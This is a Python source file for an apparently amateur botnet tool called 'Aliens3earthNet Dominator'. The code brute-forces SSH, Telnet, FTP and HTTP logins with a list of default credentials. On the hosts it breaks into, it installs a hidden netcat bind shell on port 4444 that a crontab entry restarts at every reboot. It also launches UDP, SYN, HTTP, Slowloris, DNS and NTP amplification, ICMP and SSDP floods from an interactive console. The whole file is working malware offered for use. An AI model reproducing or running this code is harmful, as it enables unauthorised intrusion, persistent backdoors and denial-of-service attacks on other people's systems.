import socket
import threading
import paramiko
import telnetlib
import ftplib
import subprocess
import netifaces
import time
import os
import random
import requests
import sys
import struct
import ssl
import json
import scapy.all as scapy
from http.client import HTTPConnection
import ipaddress
import logging

BOTNET_FILE = "aliens3earth_botnet.json"
TARGET_IP = "192.168.1.1"
TARGET_URL = "http://example.com"
THREADS = 1000
CREDS = [
    ("root", "toor"), ("admin", "admin"), ("user", "user"),
    ("root", "root"), ("root", "password"), ("root", "123456"),
    ("root", "qwerty"), ("admin", "password"), ("cisco", "cisco"),
    ("anonymous", ""), ("ftp", "ftp"), ("test", "test"),
    ("backup", "backup"), ("oracle", "oracle"), ("postgres", "postgres")
]

logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('aliens3earth_debug.log'),
        logging.StreamHandler()
    ]
)

PERSISTENT_BACKDOOR = """
mkdir -p /tmp/.aliens3earth && cat > /tmp/.aliens3earth/.backdoor << 'EOF'
#!/bin/sh
while true; do
    nc -lvp 4444 -e /bin/bash
    sleep 5
done
EOF
chmod +x /tmp/.aliens3earth/.backdoor
nohup /tmp/.aliens3earth/.backdoor >/dev/null 2>&1 &
echo "@reboot /tmp/.aliens3earth/.backdoor" | crontab -
"""

class Aliens3earthNet:
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_url = TARGET_URL
        self.threads = THREADS
        self.running = False
        self.attack_type = "UDP"
        self.botnet = self.load_botnet()
        self.sockets = []  
    
    def load_botnet(self):
        try:
            if os.path.exists(BOTNET_FILE):
                with open(BOTNET_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load botnet: {str(e)}")
        return []
    
    def save_botnet(self):
        try:
            with open(BOTNET_FILE, 'w') as f:
                json.dump(self.botnet, f)
        except Exception as e:
            logging.error(f"Failed to save botnet: {str(e)}")
    
    def add_bot(self, ip):
        if ip not in self.botnet:
            self.botnet.append(ip)
            self.save_botnet()
            logging.info(f"☠️ Added {ip} to botnet")
    
    def get_network_range(self):
        """ok"""
        try:
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr_info in addrs[netifaces.AF_INET]:
                        if 'addr' in addr_info and 'netmask' in addr_info:
                            ip = addr_info['addr']
                            netmask = addr_info['netmask']
                            network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                            return str(network)
        except Exception as e:
            logging.error(f"Failed to get network range: {str(e)}")
        return "192.168.1.0/24"  
    
    def generate_ips(self, network_range):
        """Generate all IPs in the given network range"""
        try:
            network = ipaddress.IPv4Network(network_range, strict=False)
            for ip in network.hosts():
                yield str(ip)
        except Exception as e:
            logging.error(f"Invalid network range: {network_range}. Error: {str(e)}")
            yield from []
    
    def udp_flood(self):
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(random._urandom(1024), (self.target_ip, random.randint(1, 65535)))
            except Exception as e:
                logging.debug(f"UDP flood error: {str(e)}")
                time.sleep(0.1)
    
    def tcp_syn(self):
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((self.target_ip, random.randint(1, 65535)))
            except Exception as e:
                logging.debug(f"TCP SYN error: {str(e)}")
                pass
    
    def http_flood(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        while self.running:
            try:
                requests.get(self.target_url, headers=headers, timeout=5)
            except Exception as e:
                logging.debug(f"HTTP flood error: {str(e)}")
                pass
    
    def slowloris(self):
        sockets = []
        try:
            while self.running and len(sockets) < 200:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, 80))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    sockets.append(s)
                    self.sockets.append(s)  
                except Exception as e:
                    logging.debug(f"Slowloris setup error: {str(e)}")
                    pass
            
            while self.running:
                for s in sockets[:]: 
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    except Exception as e:
                        logging.debug(f"Slowloris send error: {str(e)}")
                        if s in sockets:
                            sockets.remove(s)
                time.sleep(15)
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def dns_amplification(self):
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    dns_query = bytearray()
                    dns_query += struct.pack("!H", random.randint(0, 65535))  
                    dns_query += struct.pack("!H", 0x0100)  
                    dns_query += struct.pack("!H", 1)  
                    dns_query += struct.pack("!H", 0)  
                    dns_query += struct.pack("!H", 0)  
                    dns_query += struct.pack("!H", 0)  
                    dns_query += b"\x03www\x07example\x03com\x00" 
                    dns_query += struct.pack("!H", 0x0001)  
                    dns_query += struct.pack("!H", 0x0001)  
                    
                    sock.sendto(bytes(dns_query), (random.choice(dns_servers), 53))
            except Exception as e:
                logging.debug(f"DNS amplification error: {str(e)}")
                pass
    
    def icmp_flood(self):
        while self.running:
            try:
                scapy.send(scapy.IP(dst=self.target_ip)/scapy.ICMP(), verbose=0)
            except Exception as e:
                logging.debug(f"ICMP flood error: {str(e)}")
                pass
    
    def ntp_amplification(self):
        ntp_servers = ['pool.ntp.org', 'time.google.com']
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    ntp_query = bytearray()
                    ntp_query += b'\x17\x00\x03\x2a\x00\x00\x00\x00'
                    sock.sendto(ntp_query, (random.choice(ntp_servers), 123))
            except Exception as e:
                logging.debug(f"NTP amplification error: {str(e)}")
                pass
    
    def ssdp_flood(self):
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    ssdp_query = (
                        "M-SEARCH * HTTP/1.1\r\n"
                        "Host: 239.255.255.250:1900\r\n"
                        "Man: \"ssdp:discover\"\r\n"
                        "MX: 1\r\n"
                        "ST: ssdp:all\r\n"
                        "\r\n"
                    )
                    sock.sendto(ssdp_query.encode(), (self.target_ip, 1900))
            except Exception as e:
                logging.debug(f"SSDP flood error: {str(e)}")
                pass
   
    def infect_ssh(self, host):
        for user, passwd in CREDS:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=22, username=user, password=passwd, timeout=5)
                stdin, stdout, stderr = ssh.exec_command(PERSISTENT_BACKDOOR)
                ssh.close()
                self.add_bot(host)
                return True
            except Exception as e:
                logging.debug(f"SSH infection failed on {host}: {str(e)}")
                pass
        return False
    
    def infect_telnet(self, host):
        for user, passwd in CREDS:
            try:
                tn = telnetlib.Telnet(host, timeout=5)
                tn.read_until(b"login: ")
                tn.write(user.encode() + b"\n")
                if passwd:
                    tn.read_until(b"Password: ")
                    tn.write(passwd.encode() + b"\n")
                tn.write(PERSISTENT_BACKDOOR.encode() + b"\n")
                tn.close()
                self.add_bot(host)
                return True
            except Exception as e:
                logging.debug(f"Telnet infection failed on {host}: {str(e)}")
                pass
        return False
    
    def infect_ftp(self, host):
        for user, passwd in CREDS:
            try:
                ftp = ftplib.FTP(host, timeout=5)
                ftp.login(user=user, passwd=passwd)
                ftp.quit()
                self.add_bot(host)
                return True
            except Exception as e:
                logging.debug(f"FTP infection failed on {host}: {str(e)}")
                pass
        return False
    
    def infect_http(self, host):
        try:
            r = requests.get(f"http://{host}/shell?cmd={PERSISTENT_BACKDOOR}")
            if r.status_code == 200:
                self.add_bot(host)
                return True
        except Exception as e:
            logging.debug(f"HTTP infection failed on {host}: {str(e)}")
            pass
        return False
    
    def scan_and_infect(self, network_range=None):
        if not network_range:
            network_range = self.get_network_range()
        
        print(f"[ALIENS3EARTH] 🔍 Scanning {network_range} for vulnerable hosts...")
        
        for ip in self.generate_ips(network_range):
            if not self.running:
                break
            if self.port_open(ip, 22):  # SSH
                if self.infect_ssh(ip): continue
            if self.port_open(ip, 23):  # Telnet
                if self.infect_telnet(ip): continue
            if self.port_open(ip, 21):  # FTP
                if self.infect_ftp(ip): continue
            if self.port_open(ip, 80):  # HTTP
                if self.infect_http(ip): continue
    
    def port_open(self, ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                return result == 0
        except Exception as e:
            logging.debug(f"Port check failed on {ip}:{port}: {str(e)}")
            return False

    def shell(self):
        print("""
[ALIENS3EARTH] 🔥 Welcome to Aliens3earthNet Dominator v6.0
[ALIENS3EARTH] 💀 Type 'help' for commands
""")
        
        while True:
            try:
                cmd = input("ALIENS3EARTH> ").strip().lower()
                
                if cmd == "help":
                    print("""
[ALIENS3EARTH] === COMMANDS ===
set target ip <IP>       - Set target IP
set target url <URL>     - Set target URL
set threads <NUM>        - Set attack threads
scan                     - Scan and infect network
bots                     - Show infected bots
attack udp               - Start UDP flood
attack tcp               - Start TCP SYN flood
attack http              - Start HTTP flood
attack slowloris         - Start Slowloris attack
attack dns               - Start DNS amplification
attack icmp              - Start ICMP flood
attack ntp               - Start NTP amplification
attack ssdp              - Start SSDP flood
stop                     - Stop current attack
exit                     - Quit
""")
                
                elif cmd.startswith("set target ip"):
                    try:
                        self.target_ip = cmd.split()[2]
                        print(f"[ALIENS3EARTH] Target IP set to {self.target_ip}")
                    except IndexError:
                        print("[ALIENS3EARTH] Invalid command. Usage: set target ip <IP>")
                
                elif cmd.startswith("set target url"):
                    try:
                        self.target_url = cmd.split()[2]
                        print(f"[ALIENS3EARTH] Target URL set to {self.target_url}")
                    except IndexError:
                        print("[ALIENS3EARTH] Invalid command. Usage: set target url <URL>")
                
                elif cmd.startswith("set threads"):
                    try:
                        self.threads = int(cmd.split()[2])
                        print(f"[ALIENS3EARTH] Threads set to {self.threads}")
                    except (IndexError, ValueError):
                        print("[ALIENS3EARTH] Invalid command. Usage: set threads <NUM>")
                
                elif cmd == "scan":
                    print("[ALIENS3EARTH] 🦠 Starting network scan and infection...")
                    threading.Thread(target=self.scan_and_infect).start()
                
                elif cmd == "bots":
                    print(f"[ALIENS3EARTH] ☠️ Active bots: {len(self.botnet)}")
                    for bot in self.botnet:
                        print(f" - {bot}")
                
                elif cmd.startswith("attack"):
                    try:
                        attack_type = cmd.split()[1]
                        if attack_type in ["udp", "tcp", "http", "slowloris", "dns", "icmp", "ntp", "ssdp"]:
                            self.running = True
                            self.attack_type = attack_type.upper()
                            
                            print(f"[ALIENS3EARTH] 💣 Starting {self.attack_type} attack on {self.target_ip if attack_type != 'http' else self.target_url}")
                            
                            for _ in range(self.threads):
                                if attack_type == "udp":
                                    threading.Thread(target=self.udp_flood).start()
                                elif attack_type == "tcp":
                                    threading.Thread(target=self.tcp_syn).start()
                                elif attack_type == "http":
                                    threading.Thread(target=self.http_flood).start()
                                elif attack_type == "slowloris":
                                    threading.Thread(target=self.slowloris).start()
                                elif attack_type == "dns":
                                    threading.Thread(target=self.dns_amplification).start()
                                elif attack_type == "icmp":
                                    threading.Thread(target=self.icmp_flood).start()
                                elif attack_type == "ntp":
                                    threading.Thread(target=self.ntp_amplification).start()
                                elif attack_type == "ssdp":
                                    threading.Thread(target=self.ssdp_flood).start()
                        else:
                            print("[ALIENS3EARTH] Unknown attack type")
                    except IndexError:
                        print("[ALIENS3EARTH] Invalid command. Usage: attack <type>")
                
                elif cmd == "stop":
                    self.running = False
                    print("[ALIENS3EARTH] Attack stopped")
                
                elif cmd == "exit":
                    self.running = False
                    break
                
                else:
                    print("[ALIENS3EARTH] Unknown command")
            except Exception as e:
                logging.error(f"Command processing error: {str(e)}")

# ==== finally vro ==== #
if __name__ == "__main__":
    aliens3earth = Aliens3earthNet()
    aliens3earth.shell()
